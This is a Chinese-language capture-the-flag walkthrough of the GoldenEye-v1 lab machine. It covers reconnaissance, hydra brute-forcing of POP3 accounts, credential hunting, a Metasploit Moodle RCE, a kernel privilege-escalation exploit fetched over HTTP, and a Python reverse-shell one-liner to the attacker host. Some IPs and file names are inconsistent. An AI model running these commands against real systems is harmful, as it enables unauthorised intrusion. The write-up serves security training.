---
title: "1-GoldenEye-v1"
date: 2024-06-16
tags:
  - Others
categories:
  - Others
---
# 环境

> - 靶机：192.168.125.140
> - Kali：192.168.125.139

# 信息搜集

扫描存活主机

```shell
nmap -sP 192.168.125.0/24
```

扫描对目标主机进行扫描

```shell
nmap -sS -sV -T5 -A  192.168.125.140
```

目标主机开放25端口smtp服务，80端口http服务。

  ![[attachments/Pasted image 20240617105958.png]]
  访问目标主机。
  
![[attachments/Pasted image 20240617112230.png]]

大致意思是未发现用户，导航到`/sev-home/`目录。对该目录进行访问，发现登录页面，但是用户名密码均未知，先记录下来，继续搜集信息。

![[attachments/Pasted image 20240617112322.png]]

F12查看上一个页面源码，发现`terminal.js`文件，尝试进行访问，发现隐藏信息。

![[attachments/Pasted image 20240617115029.png]]

可以发现两个用户名`Boris、Natalya`，一个密码HTML解码得到`InvincibleHack3r`，进入刚才的登录界面分别进行尝试，成功登录（最终账号密码：boris/InvincibleHack3r）

![[attachments/Pasted image 20240617114457.png]]

"我们已经将pop3服务配置为运行在一个非常高的非默认端口上"
第三句给出提示，pop3服务运行在一个非默认端口（默认端口为110），根据所给信息，再次对原主机进行端口扫描。

```shell
nmap -p- 192.168.4.202
```

![[attachments/Pasted image 20240617115657.png]]

发现55006，55007两个开放的端口，继续扫描端口开启的服务详细信息：

```shell
nmap -sS -sV -T5 -A -p55006,55007 192.168.125.140
```

![[attachments/Pasted image 20240617121840.png]]

可以发现两个端口都开放了pop3邮件服务，尝试访问`http://192.168.4.202:55007/`失败。前面已知存在两个用户`Boris、Natalya`，尝试进行暴力破解，通过nc进行登录pop3服务。

```shell
echo -e 'natalya\nboris' > useers.txt
hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.125.140 -s 55007 pop3
```

得到结果：

```shell
[55007][pop3] host: 192.168.125.140   login: natalya   password: bird
[55007][pop3] host: 192.168.125.140   login: boris   password: secret1!
```

分别登录pop3并分别查看邮件内容。

```shell
nc 192.168.4.202 55007     # 登录邮箱
user boris                 # 登录用户 natalya
pass secret1!              # 登录密码 bird
list                       # 查看邮件数量
retr 1~3                   # 查看邮件内容
```

boris第二封邮件中提到“natalya，称她可以破坏鲍里斯的密码”；第三封邮件中提到“附件是黄金眼的最终访问密码。把它们放在这个服务器根目录下的一个隐藏文件中；一旦Xenia进入训练地点并熟悉黄金眼终端代码我们将进入最后阶段....”（应该就是flag吧！）
natalya第一封邮件提到“一个名为 Janus 的犯罪集团正在追捕 GoldenEye”；第二封邮件：

```txt
用户名:xenia
密码:RCP90rulez!
boris证实了她是合法的承包商所以只要创建账户，好吗?
如果你在外部内部域名上没有网址:severnaya-station.com/gnocertdir
**请确保编辑您的主机文件，因为您通常在网络外远程工作....
因为你是一个Linux用户，只要把这个服务器的IP指向/etc/hosts中的severnaya-station.com即可
```

得到一个新的用户名和密码，并且通过提示可以知道，要想访问到到它的服务器需要进行hosts文件配置

```shell
vim /etc/hosts
# 添加
192.168.125.140 severnaya-station.com
```

访问`http://severnaya-station.com/gnocertdir/`，可以看到是一个moodle的CMS，进行登录。

![[attachments/Pasted image 20240617161919.png]]

可以在`Home/My profile/Messages`中看到一个用户Doak的来信，并且可以在左上角看到该moodle的版本为2.2.3，先记录下来。同上面的步骤一样，对Doak的密码进行爆破。

```shell
[55007][pop3] host: 192.168.4.202   login: doak   password: goat
```

在此通过nc登录，查看邮件

```txt
James,
如果你正在阅读这篇文章，恭喜你已经走到了这一步。你知道谍报技术是怎么运作的吧?
因为我不知道。去我们的培训网站，登陆我的账号....继续挖，直到你能获取更多信息......
用户名:dr_doak
密码:4England!
```

看样子应该马上成功了。根据所提供的用户名和密码再次登录CMS，登录后在`Message`处发现同管理员的通信；在`Home/ My home` 右边发现文件`s3cret.txt`，下载查看内容：

```txt
007年,
我能够通过clear txt捕捉这个应用程序adm1n cr3ds。 
GoldenEye服务器中的大多数web应用程序中的文本都会被扫描，所以我不能在这里添加cr3dentials。
有趣的文件在这里:/dir007key/for-007.jpg
```

访问`http://severnaya-station.com/dir007key/for-007.jpg`，一张沙掉的图片，`wget http://severnaya-station.com/dir007key/for-007.jpg`下下来看看，`exiftool for-007.jpg`查看图片隐藏的一些底层内容。

![[attachments/Pasted image 20240617170933.png]]

可以发现有一条base64编码隐藏信息：`eFdpbnRlcjE5OTV4IQ==`，解码得到：`xWinter1995x!`。根据线索可以知道这应该是管理员的密码，再次登录CMS，成功拿到CMS的管理员权限。

# 漏洞利用

根据上面所得到的Moodle版本信息，搜索`Moodle 2.2.3 exp cve`发现有CVE-2013-3630 漏洞可利用。
使用MSF继续进行渗透

```shell
msfconsole          # 进入msf
search moodle       # 查找moodle类型攻击的模块
```

![[attachments/Pasted image 20240617191817.png]]

这里用第二个`moodle splling binary rce`，【搜到的是`Moodle - Remote Command Execution`，这里有点迷惑，对漏洞原理还是不太清楚，可查看文末相关链接】

![[attachments/Pasted image 20240617192001.png]]

```shell
use 1                             # 调用1  
show options                      # 显示所有选项
set username admin                # 设置用户名
set password xWinter1995x!        # 设置密码
set rhost severnaya-station.com   # 设置：rhosts
set targeturi /gnocertdir         # 设置目录： /gnocertdir
set payload cmd/unix/reverse      # 设置payload
set lhost 192.168.125.140           # 设置：lhost（需要本地IP）
```

![[attachments/Pasted image 20240617192408.png]]

所有设置完成后run失败，是因为exp应用的shell和moodle原本所设置的Google Spell不同，需进行修改。

![[attachments/Pasted image 20240617192851.png]]

管理员身份进入系统对shell进行修改，记得保存。

![[attachments/Pasted image 20240617192653.png]]

`run`运行成功获得shell，查看身份。

![[attachments/Pasted image 20240618134959.png]]

获取交互式shell，查看主机内核信息。

```shell
python -c 'import pty; pty.spawn("/bin/bash")'     # 获取交互式tty
uname -a    # 查看主机内核
```

![[attachments/Pasted image 20240618135103.png]]

搜索：Linux ubuntu 3.13.0-32 exploit，获得exp版本：37292，CVE(CAN) ID: CVE-2015-1328。在kali中搜索攻击脚本：

```shell
searchsploit 37292        # 搜索kali本地的exp库中37292攻击脚本信息
cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面/   # 将脚本文件复制到当前目录
```

![[attachments/Pasted image 20240618140045.png]]

脚本需要gcc进行编译，而目标系统没有gcc，但是可以用cc进行编译。(可用which gcc查看是否安装)

![[attachments/Pasted image 20240618135926.png]]

修改脚本内容，将143行gcc修改为cc保存。

![[attachments/Pasted image 20240618135555.png]]

kali开启http服务，供靶机下载攻击脚本。

```shell
python -m http.server 8081 # 开区http服务

wget http://192.168.125.140:8081 # 靶机下载脚本文件
```

![[attachments/Pasted image 20240618140315.png]]

对下载下来的脚本进行编译运行，成功获取root权限。进入根目录获取flag。

```shell
cc -o exp 37292.c     # C语言的CC代码编译点c文件
chmod +x exp          # 编译成可执行文件，并赋权
./exp                 # 执行

id                   # 查看目前权限
cat .flag.txt  # 读取root下的flag信息
"568628e0d993b1973adc718237da6e93"
```

![[attachments/Pasted image 20240618140723.png]]

**【另一种获取shell的方式】**
在`Home/Site administration/Server/System paths`处有执行系统命令的地方，对其进行修改。（记得保存）

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.125.139",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subproce
```

![[attachments/Pasted image 20240618150720.png]]

在kali中`c -lvp 6666`进行监听。

![[attachments/Pasted image 20240618151139.png]]

在`Home/My profile/Blogs/Add a new entry`处有触发点，点击触发后上方nc得到shell。

![[attachments/Pasted image 20240618152136.png]]

> 参考文章及漏洞相关链接：
> 
> https://blog.csdn.net/weixin_43938645/article/details/127339270
> https://www.rapid7.com/db/modules/exploit/multi/http/moodle_spelling_binary_rce/
> https://www.exploit-db.com/exploits/29324
> https://www.exploit-db.com/exploits/37292










